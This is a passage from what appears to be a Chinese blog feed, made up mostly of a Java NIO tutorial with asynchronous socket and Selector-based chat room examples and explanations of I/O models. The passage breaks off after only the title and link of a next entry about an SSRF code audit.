class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(AsynchronousSocketChannel client, Void attachment)</span>&#123;</span><br><span class="line">                <span class="comment">// 接收下一个连接请求</span></span><br><span class="line">                server.accept(<span class="literal">null</span>, <span class="built_in">this</span>);</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                Future&lt;Integer&gt; readResult = client.read(buffer);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    readResult.get();</span><br><span class="line">                    buffer.flip();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(buffer.array(), <span class="number">0</span>, buffer.remaining());</span><br><span class="line">                    System.out.println(<span class="string">&quot;接收到的消息&quot;</span> + message);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, Void attachment)</span> &#123;</span><br><span class="line">                exc.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">                <span class="comment">// 为了让服务器继续运行，我们需要组织main县城退出</span></span><br><span class="line">        Thread.currentThread().join();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Java 中，<code>Future</code> 是一种用于表示异步计算结果的接口。它提供了一种在异步任务完成后获取结果的机制。上面的代码中使用了 <code>Future&lt;Integer&gt;</code>，它的作用是表示 <code>client.read(buffer)</code> 方法的异步读取操作的结果。</p><p><code>Future</code> 的作用</p><ul><li><strong>异步操作</strong>：在 <code>client.read(buffer)</code> 中，<code>read</code> 方法是异步的，这意味着它不会立即返回读取的字节数，而是立即返回一个 <code>Future</code> 对象来表示读取操作的状态。</li><li><strong>获取结果</strong>：通过调用 <code>Future</code> 对象的 <code>get()</code> 方法，可以等待操作完成并获得最终的读取结果。此时，如果读取操作还没有完成，<code>get()</code> 会阻塞当前线程，直到读取操作完成后返回结果。</li><li><strong>控制任务完成状态</strong>：<code>Future</code> 还提供了 <code>isDone()</code> 等方法，可以在不阻塞的情况下检查任务是否完成，从而让程序更灵活地处理异步操作。</li></ul><p>示例流程说明</p><ol><li>当客户端连接时，服务器会创建一个 <code>ByteBuffer</code> 来接收数据。</li><li><code>client.read(buffer)</code> 发起异步读取，并立即返回一个 <code>Future&lt;Integer&gt;</code>。</li><li>通过 <code>readResult.get()</code> 阻塞当前线程，直到读取完成。</li><li>一旦读取完成，代码将 <code>buffer</code> 的内容转换为字符串，并输出到控制台。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 客户端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsynchronousClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">AsynchronousSocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> AsynchronousSocketChannel.open();</span><br><span class="line">            Future&lt;Void&gt; connectResult = client.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">5000</span>));</span><br><span class="line">            connectResult.get();</span><br><span class="line">            </span><br><span class="line">            <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;哈里独家阿&quot;</span>;</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap(message.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            Future&lt;Integer&gt; writeResuilt = client.write(buffer);</span><br><span class="line">            writeResuilt.get();</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;消息发送完毕&quot;</span>);</span><br><span class="line">            client.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="简单聊天室代码"><a href="#简单聊天室代码" class="headerlink" title="简单聊天室代码"></a>简单聊天室代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Chat2Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 创建一个 ServerSocketChannel</span></span><br><span class="line">        <span class="type">ServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">        serverSocketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">        serverSocketChannel.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8080</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个selector</span></span><br><span class="line">        <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line">        System.out.println(<span class="string">&quot;聊天室服务端启动了&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 客户端连接</span></span><br><span class="line">        AtomicReference&lt;SocketChannel&gt; clientRef = <span class="keyword">new</span> <span class="title class_">AtomicReference</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从控制台读取输入并发送给客户端</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">sendMessageThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">try</span>(<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in)))&#123;</span><br><span class="line">               <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                   System.out.println(<span class="string">&quot;输入服务器消息&quot;</span>);</span><br><span class="line">                   <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">                   <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> clientRef.get();</span><br><span class="line">                   <span class="keyword">if</span>(client != <span class="literal">null</span> &amp;&amp; client.isConnected())&#123;</span><br><span class="line">                       <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap((message + <span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">                       client.write(buffer);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        sendMessageThread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">readyChannels</span> <span class="operator">=</span> selector.select();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(readyChannels == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">            Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(keyIterator.hasNext())&#123;</span><br><span class="line">                <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keyIterator.next();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(key.isAcceptable())&#123;</span><br><span class="line">                    <span class="comment">// 接受客户端连接</span></span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> serverSocketChannel.accept();</span><br><span class="line">                    System.out.println(<span class="string">&quot;客户端连接&quot;</span>);</span><br><span class="line">                    client.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                    client.register(selector, SelectionKey.OP_READ);</span><br><span class="line">                    clientRef.set(client);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                    <span class="comment">// 读取客户端消息</span></span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">channel</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> channel.read(buffer);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>(bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        buffer.flip();</span><br><span class="line">                        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.remaining()];</span><br><span class="line">                        buffer.get(bytes);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes).trim();</span><br><span class="line">                        System.out.println(<span class="string">&quot;客户端消息&quot;</span> + message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                keyIterator.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Chat2Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 创建一个socketChannel</span></span><br><span class="line">        <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> SocketChannel.open();</span><br><span class="line">        socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">        socketChannel.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">8080</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个selector</span></span><br><span class="line">        <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">        socketChannel.register(selector, SelectionKey.OP_CONNECT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 哦嗯控制台读取输入并发送给服务器端</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">senMessageThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in)))&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;输入客户端消息&quot;</span>);;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">                    <span class="keyword">if</span>(socketChannel.isConnected())&#123;</span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap((message + <span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">                        socketChannel.write(buffer);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        senMessageThread.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">readyChannels</span> <span class="operator">=</span> selector.select();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(readyChannels == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">            Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(keyIterator.hasNext())&#123;</span><br><span class="line">                <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keyIterator.next();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(key.isConnectable())&#123;</span><br><span class="line">                    <span class="comment">// 连接到服务器</span></span><br><span class="line">                    socketChannel.finishConnect();</span><br><span class="line">                    socketChannel.register(selector, SelectionKey.OP_READ);</span><br><span class="line">                    System.out.println(<span class="string">&quot;已连接到服务器&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                    <span class="comment">// 读取服务器消息</span></span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                    <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(buffer);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(bytesRead &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        buffer.flip();</span><br><span class="line">                        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[buffer.remaining()];</span><br><span class="line">                        buffer.get(bytes);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes).trim();</span><br><span class="line">                        System.out.println(<span class="string">&quot;服务器消息&quot;</span> + message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                keyIterator.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面我们了解到，Java NIO 在文件 IO 上的性能其实和传统 IO 差不多，甚至在处理大文件的时候还有些甘拜下风，但 NIO 的主要作用体现在网络 IO 上，像 Netty 框架底层其实就是 NIO，我们来做一下简单的总结吧。<br>SocketChannel（用于 TCP 连接）和 ServerSocketChannel（用于监听和接受新的 TCP 连接）可以用来替代传统的 Socket 和 ServerSocket 类，提供非阻塞模式。<br>NIO 支持阻塞和非阻塞模式。非阻塞模式允许程序在等待 I&#x2F;O 时执行其他任务，从而提高并发性能。非阻塞模式的实现依赖于 Selector，它可以监控多个通道上的 I&#x2F;O 事件。<br>NIO 支持将数据分散到多个 Buffer（Scatter）或从多个 Buffer 收集数据（Gather），提供了更高效的数据传输方式。<br>Java NIO.2 引入了 AsynchronousSocketChannel 和 AsynchronousServerSocketChannel，这些类提供了基于回调的异步 I&#x2F;O 操作。异步套接字通道可以在完成 I&#x2F;O 操作时自动触发回调函数，从而实现高效的异步处理。</p><h2 id="Java-IO模型"><a href="#Java-IO模型" class="headerlink" title="Java IO模型"></a>Java IO模型</h2><p>阻塞 I&#x2F;O（Blocking I&#x2F;O）：在这种模型中，I&#x2F;O 操作是阻塞的，即执行 I&#x2F;O 操作时，线程会被阻塞，直到操作完成。在阻塞 I&#x2F;O 模型中，每个连接都需要一个线程来处理。因此，对于大量并发连接的场景，阻塞 I&#x2F;O 模型的性能较差。<br><img src="/2024/11/04/code/javanio/image-8.png"><br>非阻塞 I&#x2F;O（Non-blocking I&#x2F;O）：在这种模型中，I&#x2F;O 操作不会阻塞线程。当数据尚未准备好时，I&#x2F;O 调用会立即返回。线程可以继续执行其他任务，然后在适当的时候再次尝试执行 I&#x2F;O 操作。非阻塞 I&#x2F;O 模型允许单个线程同时处理多个连接，但可能需要在应用程序级别进行复杂的调度和管理。<br><img src="/2024/11/04/code/javanio/image-9.png"></p><p>在上面的两幅图中，涉及到了两个概念：内核空间和用户空间。我们之前在介绍非直接缓冲区的时候，有这样一副图片。<br><img src="/2024/11/04/code/javanio/image-10.png"></p><p>除了前面提到的阻塞 IO 和非阻塞 IO 模型，还有另外三种 IO 模型，分别是多路复用、信号驱动和异步 IO。</p><h3 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h3><p>I&#x2F;O 多路复用（I&#x2F;O Multiplexing）模型使用操作系统提供的多路复用功能（如 select、poll、epoll 等），使得单个线程可以同时处理多个 I&#x2F;O 事件。当某个连接上的数据准备好时，操作系统会通知应用程序。这样，应用程序可以在一个线程中处理多个并发连接，而不需要为每个连接创建一个线程。</p><ul><li>select 是 Unix 系统中最早的 I&#x2F;O 多路复用技术。它允许一个线程同时监视多个文件描述符（如套接字），并等待某个文件描述符上的 I&#x2F;O 事件（如可读、可写或异常）。select 的主要问题是性能受限，特别是在处理大量文件描述符时。这是因为它使用一个位掩码来表示文件描述符集，每次调用都需要传递这个掩码，并在内核和用户空间之间进行复制。</li><li>poll 是对 select 的改进。它使用一个文件描述符数组而不是位掩码来表示文件描述符集。这样可以避免 select 中的性能问题。然而，poll 仍然需要遍历整个文件描述符数组，以检查每个文件描述符的状态。因此，在处理大量文件描述符时，性能仍然受限。</li><li>epoll 是 Linux 中的一种高性能 I&#x2F;O 多路复用技术。它通过在内核中维护一个事件表来避免遍历文件描述符数组的性能问题。当某个文件描述符上的 I&#x2F;O 事件发生时，内核会将该事件添加到事件表中。应用程序可以使用 epoll_wait 函数来获取已准备好的 I&#x2F;O 事件，而无需遍历整个文件描述符集。这种方法大大提高了在大量并发连接下的性能。<br><img src="/2024/11/04/code/javanio/image-11.png"></li></ul><p>在 Java NIO 中，I&#x2F;O 多路复用主要通过 Selector 类实现。Selector 能够监控多个 Channel（通道）上的 I&#x2F;O 事件，如连接、读取和写入。这使得一个线程可以处理多个并发连接，提高了程序的性能和可伸缩性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">readyChannels</span> <span class="operator">=</span> selector.select();</span><br><span class="line">    <span class="keyword">if</span> (readyChannels == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    Set&lt;SelectionKey&gt; selectedKeys = selector.selectedKeys();</span><br><span class="line">    Iterator&lt;SelectionKey&gt; keyIterator = selectedKeys.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (keyIterator.hasNext()) &#123;</span><br><span class="line">        <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> keyIterator.next();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (key.isAcceptable()) &#123;</span><br><span class="line">            <span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> serverSocketChannel.accept();</span><br><span class="line">            socketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">            socketChannel.register(selector, SelectionKey.OP_READ);</span><br><span class="line">            System.out.println(<span class="string">&quot;客户端连接上了: &quot;</span> + socketChannel.getRemoteAddress());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isReadable()) &#123;</span><br><span class="line">            <span class="comment">// 处理读取数据事件</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isWritable()) &#123;</span><br><span class="line">            <span class="comment">// 处理写入数据事件</span></span><br><span class="line">        &#125;</span><br><span class="line">        keyIterator.remove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 Selector 的 select() 方法等待 I&#x2F;O 事件。select() 方法会阻塞，直到至少有一个 Channel 上的事件发生。当有事件发生时，可以通过调用 selectedKeys() 方法获取已准备好进行 I&#x2F;O 操作的 Channel 的 SelectionKey 集合。</p><h3 id="信号驱动"><a href="#信号驱动" class="headerlink" title="信号驱动"></a>信号驱动</h3><p>信号驱动 I&#x2F;O（Signal-driven I&#x2F;O）模型中，应用程序可以向操作系统注册一个信号处理函数，当某个 I&#x2F;O 事件发生时，操作系统会发送一个信号通知应用程序。应用程序在收到信号后处理相应的 I&#x2F;O 事件。这种模型与非阻塞 I&#x2F;O 类似，也需要在应用程序级别进行事件管理和调度。<br><img src="/2024/11/04/code/javanio/image-12.png"></p><p>多路复用和信号驱动的差别主要在事件通知机制和引用场景上。</p><p>多路复用模型允许一个线程同时管理多个 I&#x2F;O 连接。这是通过使用特殊的系统调用（如 select、poll 和 epoll）实现的，它们能够监视多个文件描述符上的 I&#x2F;O 事件。当某个 I&#x2F;O 事件发生时，这些系统调用会返回，通知应用程序执行相应的 I&#x2F;O 操作。I&#x2F;O 多路复用模型适用于高并发、低延迟和高吞吐量的场景，因为它能够有效地减少线程数量和上下文切换开销。</p><p>信号驱动模型依赖于信号（如 SIGIO）来通知应用程序 I&#x2F;O 事件的发生。在这个模型中，应用程序首先设置文件描述符为信号驱动模式，并为相应的信号注册处理函数。当 I&#x2F;O 事件发生时，内核会发送一个信号给应用程序，触发信号处理函数的执行。然后，应用程序可以在信号处理函数中执行相应的 I&#x2F;O 操作。I&#x2F;O 信号驱动模型适用于低并发、低延迟和低吞吐量的场景，因为它需要为每个 I&#x2F;O 事件创建一个信号和信号处理函数。</p><p>Linux 的内核将所有外部设备都看做一个文件来操作，对一个文件的读写操作会调用内核提供的系统命令(api)，返回一个 file descriptor（fd，文件描述符）。而对一个Socket的读写也会有响应的描述符，称为 socket fd（Socket文件描述符），描述符就是一个数字，指向内核中的一个结构体（文件路径，数据区等一些属性）。</p><p>在Linux下对文件的操作是利用文件描述符(file descriptor)来实现的。</p><h3 id="异步-IO"><a href="#异步-IO" class="headerlink" title="异步 IO"></a>异步 IO</h3><p>异步 I&#x2F;O（Asynchronous I&#x2F;O）模型与同步 I&#x2F;O 模型的主要区别在于，异步 I&#x2F;O 操作会在后台运行，当操作完成时，操作系统会通知应用程序。应用程序不需要等待 I&#x2F;O 操作的完成，可以继续执行其他任务。这种模型适用于处理大量并发连接，且可以简化应用程序的设计和开发。</p><ul><li>同步：在执行 I&#x2F;O 操作时，应用程序需要等待操作的完成。同步操作会导致线程阻塞，直到操作完成。同步 I&#x2F;O 包括阻塞 I&#x2F;O、非阻塞 I&#x2F;O 和 I&#x2F;O 多路复用。</li><li>异步：在执行 I&#x2F;O 操作时，应用程序不需要等待操作的完成。异步操作允许应用程序在 I&#x2F;O 操作进行时继续执行其他任务。异步 I&#x2F;O 模型包括信号驱动 I&#x2F;O 和异步 I&#x2F;O。<br><img src="/2024/11/04/code/javanio/image-13.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【代码审计】某微信小程序商城后台存在SSRF漏洞</title>
      <link href="/2024/11/01/WebSecurity/codeaudit/randomfileread/"/>
      <url>/2024/11/01/WebSecurity/codeaudit/randomfileread/</url>
      
